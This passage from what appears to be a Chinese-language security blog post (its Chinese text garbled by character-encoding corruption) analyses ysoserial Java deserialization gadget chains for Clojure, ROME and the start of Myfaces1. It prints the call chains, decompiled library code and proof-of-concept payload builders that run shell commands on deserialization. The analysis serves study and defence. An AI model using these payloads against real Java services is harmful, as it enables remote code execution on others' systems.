&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtils#getProperty æ–¹æ³•åˆ›å»º PropertyUtilsBeanï¼Œå¹¶è°ƒç”¨å…¶ getProperty æ–¹æ³•</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> PropertyUtilsBean.getInstance().getProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>PropertyUtilsBean#getProperty æ–¹æ³•ç”¨äºæ‰§è¡Œä»»åŠ¡ï¼Œè°ƒç”¨ getNestedProperty æ–¹æ³•ã€‚å…·ä½“æ˜¯è°ƒç”¨ getSimpleProperty æ–¹æ³•ï¼Œç„¶åè°ƒç”¨å¯¹è±¡çš„ getter æ–¹æ³•è·å–å±æ€§ï¼Œå®é™…è°ƒç”¨ TemplatesImpl.getOutputProperties</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getProperty</span><span class="params">(Object bean, String name)</span> <span class="keyword">throws</span> IllegalAccessException, InvocationTargetException, NoSuchMethodException </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.getNestedProperty(bean, name);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Clojure"><a href="#Clojure" class="headerlink" title="Clojure"></a>Clojure</h2><blockquote><p>Clojure æ˜¯ Lisp ç¼–ç¨‹è¯­è¨€åœ¨ Java å¹³å°ä¸Šçš„ç°ä»£ã€åŠ¨æ€åŠå‡½æ•°å¼æ–¹è¨€ï¼›è¯´ç™½äº†å°±æ˜¯ç”¨ Clojure åœ¨ Java ä¸­æ‰§è¡Œ Lisp ä»£ç ã€‚<br>åˆ©ç”¨ HashMap è¿”åºåˆ—åŒ–æ‰§è¡Œ hashCode æ–¹æ³•çš„ç‰¹æ€§ï¼Œå°†å…¶æ›¿æ¢ä¸ºè°ƒç”¨ AbstractTableModel$ff19274a.hashCode</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>clojure:1.8.0</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">ObjectInputStream.readObject()</span><br><span class="line">HashMap.readObject()</span><br><span class="line">AbstractTableModel$ff19274a.hashCode()</span><br><span class="line">clojure.core$comp$fn__4727.invoke()</span><br><span class="line">clojure.core$constantly$fn__4614.invoke()</span><br><span class="line">clojure.main$eval_opt.invoke()</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/hIj4DHVNTepsAaw.png" ><p>ysoserial.payloads.Clojure#getObject è¿”å›çš„ targetMap(HashMap) åŒ…å« <code>model(AbstractTableModel$ff19274a) -&gt; null</code> çš„æ˜ å°„ï¼Œmodel.__initClojureFnMappings = fnMap(HashMap)ï¼ŒfnMapä¸­çš„é”®ä¸º hashCodeï¼Œå€¼ä¸º gã€f(core$comp$fn__4727)ã€‚</p><p>ååºåˆ—åŒ–æ—¶è°ƒç”¨ HashMap.readObjectï¼Œè¿›ä¸€æ­¥è°ƒç”¨ AbstractTableModel$ff19274a.hashCodeï¼Œå› ä¸º __clojureFnMap æœ‰å€¼æ‰€ä»¥è°ƒç”¨ core$comp$fn__4727.invoke æœ€ç»ˆè°ƒç”¨çš„æ˜¯æ„é€ çš„ <code>clojure.core\$comp().invoke(clojure.main\$eval_opt(), clojure.core\$constantly().invoke(clojurePayload))</code>ã€‚clojure.core$constantly().invoke(clojurePayload) è¿”å› core$constantly$fn__4614 å¯¹è±¡ï¼Œå…¶å±æ€§ x ä¸ºæ„é€ çš„ payloadï¼Œåç»­è¿›å…¥ clojure.main$eval_opt().invokeStatic çš„ for å¾ªç¯æ—¶æ‰§è¡ŒæŒ‡ä»¤ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// AbstractTableModel$ff19274a</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Object var10000 = RT.get(<span class="keyword">this</span>.__clojureFnMap, <span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> var10000 != <span class="keyword">null</span> ? ((Number)((IFn)var10000).invoke(<span class="keyword">this</span>)).intValue() : <span class="keyword">super</span>.hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$comp$fn__4727</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> ((IFn)<span class="keyword">this</span>.f).invoke(((IFn)<span class="keyword">this</span>.g).invoke());</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">    IFn var10000 = (IFn)<span class="keyword">this</span>.f;</span><br><span class="line">    IFn var10001 = (IFn)<span class="keyword">this</span>.g;</span><br><span class="line">    Object var10002 = x;</span><br><span class="line">    x = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> var10000.invoke(var10001.invoke(var10002));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main$eval_opt</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object str)</span> </span>&#123;</span><br><span class="line">    Object eof = <span class="keyword">new</span> Object();</span><br><span class="line">    Object var10004 = str;</span><br><span class="line">    str = <span class="keyword">null</span>;</span><br><span class="line">    Object reader = <span class="keyword">new</span> LineNumberingPushbackReader((Reader)(<span class="keyword">new</span> StringReader((String)var10004)));</span><br><span class="line">    push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    <span class="keyword">for</span>(Object input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7422(reader, eof))).invoke(); !Util.equiv(input, eof); input = ((IFn)(<span class="keyword">new</span> main$eval_opt$fn__7424(reader, eof))).invoke()) &#123; <span class="comment">// æ‰§è¡ŒæŒ‡ä»¤</span></span><br><span class="line">        Object var10000 = input;</span><br><span class="line">        input = <span class="keyword">null</span>;</span><br><span class="line">        Object value = eval.invokeStatic(var10000);</span><br><span class="line">        <span class="keyword">if</span> (Util.identical(value, (Object)<span class="keyword">null</span>)) &#123;</span><br><span class="line">            var10000 = <span class="keyword">null</span>;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Object[] var5 = <span class="keyword">new</span> Object[<span class="number">1</span>];</span><br><span class="line">            Object var10003 = value;</span><br><span class="line">            value = <span class="keyword">null</span>;</span><br><span class="line">            var5[<span class="number">0</span>] = var10003;</span><br><span class="line">            prn.invokeStatic(ArraySeq.create(var5));</span><br><span class="line">        &#125;</span><br><span class="line">        push_thread_bindings.invokeStatic(hash_map.invokeStatic(ArraySeq.create(<span class="keyword">new</span> Object[]&#123;const__2, Util.equiv(const__4, const__2.get()) ? Boolean.TRUE : const__2.get()&#125;)));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// core$constantly$fn__4614</span></span><br><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>POC æ„é€ å¦‚ä¸‹ï¼Œæ³¨é‡Šæ‰å…¶ä¸­ä¸¤è¡Œä¹Ÿå¯ä»¥æ‰§è¡ŒæˆåŠŸ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> Map&lt;?, ?&gt; getObject(<span class="keyword">final</span> String command) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// è½¬ä¹‰</span></span><br><span class="line">    String cmd = Strings.join(Arrays.asList(command.replaceAll(<span class="string">&quot;\\\\&quot;</span>,<span class="string">&quot;\\\\\\\\&quot;</span>).replaceAll(<span class="string">&quot;\&quot;&quot;</span>,<span class="string">&quot;\\&quot;</span>).split(<span class="string">&quot; &quot;</span>)), <span class="string">&quot; &quot;</span>, <span class="string">&quot;\&quot;&quot;</span>, <span class="string">&quot;\&quot;&quot;</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åœ¨ Clojure åŒ…ä¸­è°ƒç”¨ shell å‘½ä»¤</span></span><br><span class="line">    <span class="keyword">final</span> String clojurePayload =</span><br><span class="line">        String.format(<span class="string">&quot;(use &#x27;[clojure.java.shell :only [sh]]) (sh %s)&quot;</span>, cmd);</span><br><span class="line">    </span><br><span class="line">    <span class="comment">// åˆå§‹åŒ–</span></span><br><span class="line">    Map&lt;String, Object&gt; fnMap = <span class="keyword">new</span> HashMap&lt;String, Object&gt;();</span><br><span class="line"><span class="comment">// fnMap.put(&quot;hashCode&quot;, new clojure.core$constantly().invoke(0));</span></span><br><span class="line">    </span><br><span class="line">    AbstractTableModel$ff19274a model = <span class="keyword">new</span> AbstractTableModel$ff19274a();</span><br><span class="line"><span class="comment">// model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span></span><br><span class="line">    </span><br><span class="line">    HashMap&lt;Object, Object&gt; targetMap = <span class="keyword">new</span> HashMap&lt;Object, Object&gt;();</span><br><span class="line">targetMap.put(model, <span class="keyword">null</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ·»åŠ åˆ° Map ä¸­</span></span><br><span class="line">    fnMap.put(<span class="string">&quot;hashCode&quot;</span>,</span><br><span class="line"><span class="keyword">new</span> clojure.core$comp().invoke(</span><br><span class="line"><span class="keyword">new</span> clojure.main$eval_opt(),    <span class="comment">// å‡½æ•°ä½“ä¸ºç©º</span></span><br><span class="line"><span class="keyword">new</span> clojure.core$constantly().invoke(clojurePayload))); <span class="comment">// core$constantly å‡½æ•°ä½“ä¸ºç©º</span></span><br><span class="line">    <span class="comment">// é€šè¿‡ PersistentArrayMap è½¬æ¢ fnMap çš„å±æ€§</span></span><br><span class="line">model.__initClojureFnMappings(PersistentArrayMap.create(fnMap));</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> targetMap;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$constantly().invoke(clojurePayload) å®é™…è°ƒç”¨ core$constantly$fn__4614(clojurePayload)</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">core</span>$<span class="title">constantly</span> <span class="keyword">extends</span> <span class="title">AFunction</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> core$constantly() &#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object x)</span> </span>&#123;</span><br><span class="line">        Object var10002 = x;</span><br><span class="line">        x = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">new</span> core$constantly$fn__4614(var10002);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1)</span> </span>&#123;</span><br><span class="line">        Object var10000 = var1;</span><br><span class="line">        var1 = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">return</span> invokeStatic(var10000);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å°±ä¸€ä¸ªèµ‹å€¼æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$constantly$fn__4614(Object var1) &#123;</span><br><span class="line">    <span class="keyword">this</span>.x = var1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>clojure.core$comp().invoke å®é™…è°ƒç”¨ core$comp$fn__4727</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">invoke</span><span class="params">(Object var1, Object var2)</span> </span>&#123;</span><br><span class="line">    Object var10000 = var1;</span><br><span class="line">    var1 = <span class="keyword">null</span>;</span><br><span class="line">    Object var10001 = var2;</span><br><span class="line">    var2 = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> invokeStatic(var10000, var10001);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">invokeStatic</span><span class="params">(Object f, Object g)</span> </span>&#123;</span><br><span class="line">    Object var10002 = g;</span><br><span class="line">    g = <span class="keyword">null</span>;</span><br><span class="line">    Object var10003 = f;</span><br><span class="line">    f = <span class="keyword">null</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">new</span> core$comp$fn__4727(var10002, var10003);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ä¹Ÿå°±ä¸€ä¸ªèµ‹å€¼æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> core$comp$fn__4727(Object var1, Object var2) &#123;</span><br><span class="line">    <span class="keyword">this</span>.g = var1;</span><br><span class="line">    <span class="keyword">this</span>.f = var2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>model.__initClojureFnMappings(PersistentArrayMap.create(fnMap)); ä¹Ÿå°±æ˜¯èµ‹å€¼æ“ä½œ</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">__updateClojureFnMappings</span><span class="params">(IPersistentMap var1)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">this</span>.__clojureFnMap = (IPersistentMap)((IPersistentCollection)<span class="keyword">this</span>.__clojureFnMap).cons(var1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="ROME"><a href="#ROME" class="headerlink" title="ROME"></a>ROME</h2><blockquote><p>ROME æ˜¯ RSS/Atom è®¢é˜…æ¡†æ¶<br>å’Œ CC2 ç±»ä¼¼ï¼Œä½¿ç”¨ TemplatesImpl æ‰¿è½½æ¶æ„ä»£ç ï¼›å’Œ URLDNS ç±»ä¼¼ï¼Œåˆ©ç”¨ HashMap çš„ååºåˆ—åŒ–æ“ä½œ<br>é€šè¿‡ ObjectBean.hashCode è§¦å‘</p></blockquote><p>é€‚ç”¨ç‰ˆæœ¬</p><ul><li>rome:1.0</li></ul><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ObjectBean.hashCode()</span><br><span class="line">                EqualsBean.beanHashCode()</span><br><span class="line">                    ObjectBean.toString()</span><br><span class="line">                        ToStringBean.toString()</span><br><span class="line">                            ToStringBean.toString(String)</span><br><span class="line">                                Method.invoke()</span><br><span class="line">                                    TemplatesImpl.getOutputProperties()</span><br><span class="line">                                        ...</span><br></pre></td></tr></table></figure><img src="https://i.loli.net/2021/11/12/kIZ8fRB4lNpuyA9.png" ><p>ysoserial.payloads.ROME#getObject ååˆ†ç®€çŸ­ï¼Œéœ€è¦æ³¨æ„çš„æ˜¯è¿™é‡Œå¿…é¡»é€šè¿‡ä¸¤ä¸ª ObjectBean æ‰èƒ½è§¦å‘æ¼æ´</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">getObject</span> <span class="params">( String command )</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">    <span class="comment">// åˆ›å»º TemplatesImpl æ‰¿è½½æ‰§è¡Œä»£ç </span></span><br><span class="line">    Object o = Gadgets.createTemplatesImpl(command);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// é€šè¿‡ä¸¤ä¸ª ObjectBean è¾¾æˆè§¦å‘æ¡ä»¶</span></span><br><span class="line">    ObjectBean delegate = <span class="keyword">new</span> ObjectBean(Templates.class, o);</span><br><span class="line">    ObjectBean root  = <span class="keyword">new</span> ObjectBean(ObjectBean.class, delegate);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// æ„é€  HashMap</span></span><br><span class="line">    <span class="keyword">return</span> Gadgets.makeMap(root, root);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å¦‚æœåªç”¨ <code>ObjectBean(Templates.class, TemplatesImpl)</code> æ„é€  HashMapï¼Œåˆ™ååºåˆ—åŒ–æ—¶æŠ¥é”™</p><ul><li>æ„é€  POC ç”¨çš„æ˜¯ <code>ObjectBean(ObjectBean.class, ObjectBean(Templates.class, TemplatesImpl))</code></li></ul><p>å› ä¸ºè®¡ç®—å“ˆå¸Œå€¼æ—¶ä¼šå¯¹ value(TemplatesImpl) è°ƒç”¨ <code>ObjectBean.hashCode</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Exception <span class="keyword">in</span> thread <span class="string">&quot;main&quot;</span> java.lang.IllegalArgumentException: class com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl is not instance of class com.sun.syndication.feed.impl.ObjectBean</span><br><span class="line">at com.sun.syndication.feed.impl.EqualsBean.&lt;init&gt;(EqualsBean.java:85)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:74)</span><br><span class="line">at com.sun.syndication.feed.impl.ObjectBean.&lt;init&gt;(ObjectBean.java:56)</span><br><span class="line">at ysoserial.payloads.ROME.getObject(ROME.java:38)</span><br></pre></td></tr></table></figure><p>å½“ HashMap ååºåˆ—åŒ–æ—¶ä¼šå¯¹å…ƒç´ è®¡ç®—å“ˆå¸Œå€¼ï¼Œè°ƒç”¨å¯¹è±¡çš„ hashCode æ–¹æ³•ï¼Œè¿™é‡Œå°±æ˜¯ <code>ObjectBean.hashCode</code> æ–¹æ³•ï¼Œå®é™…è°ƒç”¨çš„æ˜¯ <code>EqualsBean.beanHashCode</code>ï¼Œç„¶åè¿›ä¸€æ­¥è°ƒç”¨ <code>ObjectBean.toString</code> æ–¹æ³•è¿”å› <code>ToStringBean.toString</code>ï¼Œåœ¨è¿™ä¸ªå‡½æ•°ä¸­ä¼šè§¦å‘ <code>TemplatesImpl.getOutputProperties</code>ã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">hashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._equalsBean.beanHashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// EqualsBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">beanHashCode</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._obj.toString().hashCode();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ObjectBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>._toStringBean.toString();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// ToStringBean</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">toString</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    Stack stack = (Stack)PREFIX_TL.get();</span><br><span class="line">    String[] tsInfo = (String[])(stack.isEmpty() ? <span class="keyword">null</span> : stack.peek());</span><br><span class="line">    String prefix;</span><br><span class="line">    <span class="keyword">if</span> (tsInfo == <span class="keyword">null</span>) &#123;</span><br><span class="line">        String className = <span class="keyword">this</span>._obj.getClass().getName();</span><br><span class="line">        prefix = className.substring(className.lastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        prefix = tsInfo[<span class="number">0</span>];</span><br><span class="line">        tsInfo[<span class="number">1</span>] = prefix;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">this</span>.toString(prefix);   <span class="comment">// è¿™é‡Œ</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">private</span> String <span class="title">toString</span><span class="params">(String prefix)</span> </span>&#123;</span><br><span class="line">    StringBuffer sb = <span class="keyword">new</span> StringBuffer(<span class="number">128</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        PropertyDescriptor[] pds = BeanIntrospector.getPropertyDescriptors(<span class="keyword">this</span>._beanClass);</span><br><span class="line">        <span class="keyword">if</span> (pds != <span class="keyword">null</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; pds.length; ++i) &#123;</span><br><span class="line">                String pName = pds[i].getName();</span><br><span class="line">                Method pReadMethod = pds[i].getReadMethod();</span><br><span class="line">                <span class="keyword">if</span> (pReadMethod != <span class="keyword">null</span> &amp;&amp; pReadMethod.getDeclaringClass() != Object.class &amp;&amp; pReadMethod.getParameterTypes().length == <span class="number">0</span>) &#123;</span><br><span class="line">                    Object value = pReadMethod.invoke(<span class="keyword">this</span>._obj, NO_PARAMS);    <span class="comment">// æ‰§è¡ŒæŒ‡ä»¤ï¼Œæ§åˆ¶ this._obj ä¸º TemplatesImplï¼ŒpReadMethod.name ä¸º getOutputProperties</span></span><br><span class="line">                    <span class="keyword">this</span>.printProperty(sb, prefix + <span class="string">&quot;.&quot;</span> + pName, value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception var8) &#123;</span><br><span class="line">        sb.append(<span class="string">&quot;\n\nEXCEPTION: Could not complete &quot;</span> + <span class="keyword">this</span>._obj.getClass() + <span class="string">&quot;.toString(): &quot;</span> + var8.getMessage() + <span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> sb.toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="Myfaces1"><a href="#Myfaces1" class="headerlink" title="Myfaces1"></a>Myfaces1</h2><blockquote><p>MyFaces æ˜¯æ‰˜ç®¡å¤šä¸ªä¸ MVC Web åº”ç”¨æ¡†æ¶ JavaServer Faces(JSF) æŠ€æœ¯ç›¸å…³çš„å­é¡¹ç›®ï¼›MyFaces Core é¡¹ç›®æ˜¯ JSF è§„èŒƒçš„å®ç°<br>ç»“åˆäº†ååºåˆ—åŒ–ä¸ EL è¡¨è¾¾å¼æ‰§è¡Œçš„ç›¸å…³ç‰¹ç‚¹ã€‚EL è¡¨è¾¾å¼çš„ä¸»è¦ä½œç”¨æ˜¯åœ¨Java Webåº”ç”¨ç¨‹åºåµŒå…¥åˆ°ç½‘é¡µä¸­ï¼Œç”¨ä»¥è®¿é—®é¡µé¢çš„ä¸Šä¸‹æ–‡ä»¥åŠä¸åŒä½œç”¨åŸŸä¸­çš„å¯¹è±¡ï¼Œå–å¾—å¯¹è±¡å±æ€§çš„å€¼ï¼Œæˆ–æ‰§è¡Œç®€å•çš„è¿ç®—æˆ–åˆ¤æ–­æ“ä½œã€‚<br>éœ€è¦æ„é€  EL è¡¨è¾¾å¼ä½œä¸º payload</p></blockquote><p>åˆ©ç”¨é“¾</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">GadgetChain:</span><br><span class="line">    HashMap.readObject()</span><br><span class="line">        HashMap.hash()</span><br><span class="line">            ValueExpressionMethodExpression.hashCode()</span><br><span class="line">                ValueExpressionMethodExpression.getMethodExpression()</span><br><span class="line">                    ValueExpressionMethodExpression.getMethodExpression(ELContext)</span><br><span class="line">                        ValueExpressionImpl.getValue()</span><br></pre></td></tr></table></figure><p>ysoserial.payloads.Myfaces1#makeExpressionPayload åˆ©ç”¨ MyFaces æ„é€ 